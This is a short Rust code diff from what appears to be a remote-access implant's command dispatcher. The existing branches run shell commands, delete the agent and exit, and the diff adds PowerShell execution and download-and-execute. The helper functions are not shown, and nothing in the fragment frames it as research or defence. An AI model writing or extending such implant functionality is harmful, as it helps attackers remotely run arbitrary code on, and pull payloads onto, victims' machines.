@@ -46,6 +46,8 @@ impl Command {
     pub fn execute(&self) -> Result<String, io::Error> {
         match self.kind() {
             CommandKind::Cmd => functions::cmd_exec(self.content()),
+            CommandKind::PowerShell => functions::ps_exec(self.content()),
+            CommandKind::DownloadExec => functions::download_exec(self.content()),
             CommandKind::Delete => functions::delete_agent(),
             CommandKind::Exit => functions::exit(),
             CommandKind::Echo => functions::echo_reply(),
